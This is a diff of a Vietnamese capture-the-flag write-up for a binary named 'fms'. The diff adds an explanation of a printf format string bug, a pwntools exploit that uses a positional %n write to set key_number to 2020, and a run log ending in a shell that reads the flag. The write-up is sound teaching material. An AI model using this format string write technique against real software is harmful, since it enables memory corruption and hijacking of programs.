@@ -58,7 +58,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-Chương trình cho phép chúng ta nhập vào input dài tối đa 64 ký tự. Trường hợp input không chứa `no` và `yes` thì chương trình in ra input của chúng ta vừa nhập vào. Điều đáng chú ý ở đây là lệnh `printf(&s);` thiếu tham số format string (viết tắt là fms như tên file). Lỗ hổng format string là như thế nào, chúng ta có thể khai thác gì từ nó, cách khai thác như thế nào - xem ở [video 1](https://www.youtube.com/watch?v=0WvrSfcdq1I) và [video 2](https://www.youtube.com/watch?v=t1LH9D5cuK4) (video khá ngắn gọn và dễ hiểu, chỉ cần xem bằng cả con tim là được).
+Chương trình cho phép chúng ta nhập vào input dài tối đa 64 ký tự. Trường hợp input không chứa `no` và `yes` thì chương trình in ra input của chúng ta vừa nhập vào. Điều đáng chú ý ở đây là lệnh `printf(&s);` thiếu tham số format string (viết tắt là fms như tên file). Lỗ hổng format string là như thế nào, chúng ta có thể khai thác gì từ nó, cách khai thác như thế nào - xem ở [video 1](https://www.youtube.com/watch?v=0WvrSfcdq1I) và [video 2](https://www.youtube.com/watch?v=t1LH9D5cuK4) (video khá ngắn gọn và dễ hiểu, chỉ cần xem bằng cả con tim là được, mình thì hơi ngu nên xem tầm chục lần mới hiểu rõ).
 
 Sau khi in ra input chúng ta nhập vào. Chương trình gọi hàm `check_key`:
 
@@ -178,9 +178,9 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 
 Có thể thấy giá trị tại địa chỉ `0x0804a04c` (chính là `key_number`) được lưu vào thanh ghi `eax` và có giá trị là `0`. Chúng ta sẽ tìm cách gán `2020` vào địa chỉ này.
 
-Quay lại ví dụ bên trên `printf("damdang%n", &boo);`. Trường hợp này là truyền đủ và đúng tham số, nhưng chúng ta không cần quan tâm tới việc truyền đúng hay sai. Bản chất cách hoạt động của hàm trên là đếm số ký tự trước `%n` và gán vào vị trí mà `%n` trỏ tới. Có nghĩa là trước hết chúng ta cần đảm bảo hàm `printf` trỏ tới địa chỉ `0x0804a04c`.
+Quay lại ví dụ bên trên `printf("damdang%n", &boo);`. Trường hợp này là truyền đủ và đúng tham số, nhưng chúng ta không cần quan tâm tới việc truyền đúng hay sai. Bản chất cách hoạt động của hàm trên là đếm số ký tự trước `%n` và gán vào vị trí mà `%n` trỏ tới.
 
-Chúng ta sẽ thử như sau:
+Chúng ta thử như sau:
 
 ```
 kali@kali:~/Desktop/WGC August 2020$ python -c "print 'aaaa' + '%x'*1" | ./fms
@@ -225,13 +225,52 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 
 Thanh ghi `eax` lưu giá trị `0x1b` - có nghĩa là chúng ta đã gán giá trị cho `key_number` thành công.
 
-Như đã nói ở trên, hàm `printf` đếm số ký tự trước `%n` và gán vào vị trí mà `%n` trỏ tới, mà giá trị chúng ta muốn gán là `2020` - có nghĩa trước `%n` phải có `2020` ký tự, trong khi độ dài input tối đa mà chương trình cho chúng ta nhập là `64`. Để giả quyết vấn đề này, chúng ta sử dụng ký hiệu `$`, cụ thể như sau:
+Như đã nói ở trên, hàm `printf` đếm số ký tự trước `%n` và gán vào vị trí mà `%n` trỏ tới, mà giá trị chúng ta muốn gán là `2020` - có nghĩa trước `%n` phải có `2020` ký tự, trong khi độ dài input tối đa mà chương trình cho chúng ta nhập là `64`.
 
-##########################
-\#  Cú pháp: `%X$Y<fms>`  \#
-##########################
+Để giả quyết vấn đề độ dài input không đủ lớn, chúng ta sử dụng ký hiệu `$`, cú pháp như sau: `%X$Y<fms>`. `<fms>` sẽ trỏ tới vị trí `X`, output ra màn hình có độ dài là `Y`. Áp dụng vào challenge này, ta có input như sau:
 
-- Chúng ta đã biết rằng nếu địa chỉ của `key_number` ở đầu input, thì format string thứ `4` sẽ trỏ tới địa chỉ đó --> X = 4. Đặt biệt là nếu làm
+- Địa chỉ `0x0804a04c`.
+- Fomat string `%x`:
+  - Chỗ này X = 1, 2, 3, 4, ... gì cũng được, bởi vì mục đích chính ở đây là in ra `2020` ký tự trước `%n` chứ không quan tâm format string này trỏ tới đâu. Thôi thì lấy `X = 4` bởi vì c____ h__ m___ 4 t___ (chuyện thầm kín :v).
+  - Chúng ta cần `2020` ký tự trước `%n` --> 2020 - 4 (4 byte của địa chỉ) = `2016 = Y`.
+- Fomat string `%n`:
+  - Chỗ này thì bắt buộc `X = 4` để format string trỏ tới địa chỉ `0x0804a04c` (tại sao là `4` thì đã giải thích ở chỗ thử `aaaa` bên trên).
+  - `Y` thì không cần thiết nên chúng ta có thể bỏ qua.
+
+Vậy cuối cùng chúng ta có đoạn code exploit như sau:
+
+```
+key_address = 0x804a04c
+
+p = ''
+p += p32(key_address)
+p += '%4$2016x'
+p += '%4$n'
+
+proc = process('./fms')
+proc.sendlineafter('here?', p)
+proc.interactive()
+proc.close()
+```
+
+Runnnnnnnnnnn:
+
+```
+kali@kali:~/Desktop/WGC August 2020$ python fms_exploit.py
+[+] Starting local process './fms': pid 43923
+[*] Switching to interactive mode
+ (yes or no)
+L\xa0\x04                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         804a04c
+$ ls
+core  fms_exploit.py                RSHack        slc
+flag  nothing_or_everything.png            rtl            slc_exploit.py
+fms   _nothing_or_everything.png.extracted  rtl_exploit.py
+$ cat flag
+flag{--- --- --- --- boodamdang --- --- --- ---}
+$ exit
+Good[*] Process './fms' stopped with exit code 0 (pid 43923)
+[*] Got EOF while reading in interactive
+```
 
 ## It is simple, but not easy
 
